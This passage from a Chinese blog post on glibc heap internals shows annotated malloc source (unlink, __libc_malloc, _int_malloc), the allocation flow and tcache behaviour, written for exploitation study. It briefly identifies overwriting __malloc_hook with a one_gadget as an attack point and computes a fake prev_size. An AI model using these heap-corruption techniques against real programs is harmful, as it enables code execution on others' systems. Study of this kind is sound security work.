(__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))          \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);            \</span><br><span class="line">    <span class="keyword">else</span> &#123;                      \</span><br><span class="line">        FD-&gt;bk = BK;                    \</span><br><span class="line">        BK-&gt;fd = FD;<span class="comment">//把自己解除链接，让自己的前一个和后一个相连                   </span></span><br><span class="line">        </span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))            \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;          \</span><br><span class="line">            \</span><br><span class="line">            \<span class="comment">/* largebin 中 next_size 双向链表完整性检查 */</span>\</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        \</span><br><span class="line">    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;              \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)              \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;          \</span><br><span class="line">                <span class="keyword">else</span> &#123;                    \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;            \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;            \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;            \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;            \</span><br><span class="line">                  &#125;                    \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                    \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;          \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;          \</span><br><span class="line">              &#125;                      \</span><br><span class="line">          &#125;                      \</span><br><span class="line">      &#125;                        \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Our fake prev_size will be 0x555555559300 - 0x5555555592a0 = 0x60</p>
<h2 id="lib-malloc-、-int-malloc-）、-lib-free-、malloc-hook详解"><a href="#lib-malloc-、-int-malloc-）、-lib-free-、malloc-hook详解" class="headerlink" title="_lib_malloc() 、_int_malloc(）、_lib_free()、malloc_hook详解"></a>_lib_malloc() 、_int_malloc(）、_lib_free()、malloc_hook详解</h2><p>当我们在应用层调用堆的时候，在glibc中实际上调用的是__libc_malloc函数,但是这个函数也是用来简单封装  _int_malloc()函数的，这个intmalloc才是申请堆的核心函数。</p>
<p>在libmalloc中，它首先通过mallochook全局变量获取一个函数指针，判断这个函数是否为空，这个函数指针指向的函数表示用户自定义的堆分配函数，主要是为了方便用户快速修改该函数并进行测试。</p>
<h4 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h4><p>如果这个mallochook被修改，那么就会执行被修改后的函数（one_gadget）。</p>
<h2 id="libmalloc："><a href="#libmalloc：" class="headerlink" title="libmalloc："></a>libmalloc：</h2><p><img src="https://img-blog.csdnimg.cn/20190810082836599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70"></p>
<p>从下面的源码可以看到，先读取__malloc_hook全局变量，然后判断是否有用户自定义的堆分配函数，如果有就执行，不再进行系统的堆分配了(_int_malloc)。</p>
<p><strong>[这里可以直接做个流程图]</strong></p>
<p>如果返回hook是空，则继续下面的操作</p>
<p><img src="https://img-blog.csdnimg.cn/2019081008403339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70"></p>
<p>1.寻找一个arena来试图分配内存（通过arena_get（）函数来寻找arena）</p>
<p>2.执行intmalloc函数申请内存</p>
<p>3.下面if判断如果咱们申请失败了，会再次申请arena和内存</p>
<p>4.如果申请成功了，咱们就在arena中分配内存了，最后退出的时候对申请来的arena解锁。</p>
<p>5.最终返回内存。</p>
<h2 id="int-malloc内部操作"><a href="#int-malloc内部操作" class="headerlink" title="int_malloc内部操作"></a>int_malloc内部操作</h2><p>int_malloc会根据应用层用户申请的内存块大小分配相应的chunk给用户使用。</p>
<h4 id="其主要执行流程："><a href="#其主要执行流程：" class="headerlink" title="其主要执行流程："></a>其主要执行流程：</h4><blockquote>
<p>①请求大小在fastbin的范围内：在fastbins中找是否有对应的chunk可以使用。<br>②请求大小在smallbin的范围内：在smallbin中找是否有对应的chunk可以使用。<br>③请求大小在largebin的范围内：先调用malloc_consolidate对fastbins进行整理。然后在unsortedbin中查看是否有满足要求的chunk可以使用。<br>④在largebin中寻找可用的chunk来使用。<br>⑤寻找较大的bin链中是否有可用的chunk来使用。<br>⑥切割topchunk来使用。<br>⑦topchunk也不够了，再次调用malloc_consolidate整理fastbins。<br>⑧topchunk不够用，再次malloc_consolidate之后还没有可以用的，最终调用sysmalloc（系统调用）申请内存。</p>
</blockquote>
<h4 id="其主要执行流程版本二："><a href="#其主要执行流程版本二：" class="headerlink" title="其主要执行流程版本二："></a>其主要执行流程版本二：</h4><blockquote>
<p>malloc分配步骤大致如下：<br>1.检查有没有_malloc_hook，有则调用hook函数。<br>2.获得分配区的锁，调用函数_int_malloc()分配内存。<br>3.如果申请大小在fast bin范围内，则从fast bin分配chunk，成功则返回用户指针，否则进行下一步。(当对应的bin为空时，就会跳过第5步操作)<br>4.如果申请大小在small bin范围内，则从small bin中分配chunk，成功则返回用户指针，否则进行下一步。<br>5.调用malloc_consolidate()函数合并fast bin，并链接进unsorted bin中。<br>6.如果申请大小在small bin范围内，且此时unsorted bin只有一个chunk，并且这个chunk为last remainder chunk且大小够大，则从这个chunk中切分出需要的大小，成功则返回用户指针，否则进行下一步。<br>7.反向遍历unsorted bin，如果当前chunk与所需chunk大小一致，则分配，成功则返回用户指针，否则将当前chunk放入small bin或者large bin中合适的位置。<br>8.使用最佳匹配算法在large bin中找到合适的chunk进行分配，成功则返回用户指针，否则进行下一步。<br>9.到了这一步，说明没有大小正好合适的chunk，则看看比当前bin的index大的small bin或者large bin中有没有空闲chunk可用来分配。成功则返回用户指针，否则进行下一步。<br>10.尝试从top chunk中分配，成功则返回用户指针，否则进行下一步。<br>11.如果fast bin中还有chunk，调用malloc_consolidate()回到第6步(因为第3步对应bin为空时会跳过第五步，而fast bin合并之后有可能出现能够分配的small bin)。<br>12.到了这步还不行，则调用sYSMALLOc()函数向系统申请  内存。</p>
</blockquote>
<p>这里面没写到tcache的分配是因为libcmalloc的时候就已经把tcache给分配出去了。</p>
<p><a target="_blank" rel="noopener" href="https://shizhongpwn.github.io/2020/01/30/tcache-attack/">https://shizhongpwn.github.io/2020/01/30/tcache-attack/</a>   tcache出现的具体代码段，以及分配流程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;<span class="comment">//在这里分配tcache， 检查tcache索引tc_idx是否合法，以及该索引中是否有空闲块。若有，则直接取出并返回给用户</span></span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//上下判断请求是否由主线程发起，上是main arena（主线程发起的），下把当前线程arena存入ar_ptr中，再调用_int_malloc申请内存块。</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;<span class="comment">//再次获取arena锁，然后进入int_malloc分配内存。</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);<span class="comment">//分配完了则释放arena锁</span></span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br><span class="line"></span><br></pre></td></tr></table></figure>




















<h3 id="拥有tcache的工作方式"><a href="#拥有tcache的工作方式" class="headerlink" title="拥有tcache的工作方式"></a>拥有tcache的工作方式</h3><p>第一次malloc,会先申请个堆块存放tcache_prethread_struct</p>
<p>free的堆块先放入tcache(size合适的话)</p>
<ul>
<li>tcache对应链表没满之前，先放入该链表，满了之后才放入fastbin或者unsorted bin这些。</li>
<li>malloc时先从对应tcache中取</li>
<li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">---------------------------------------------定义相关变量------------------------------</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span 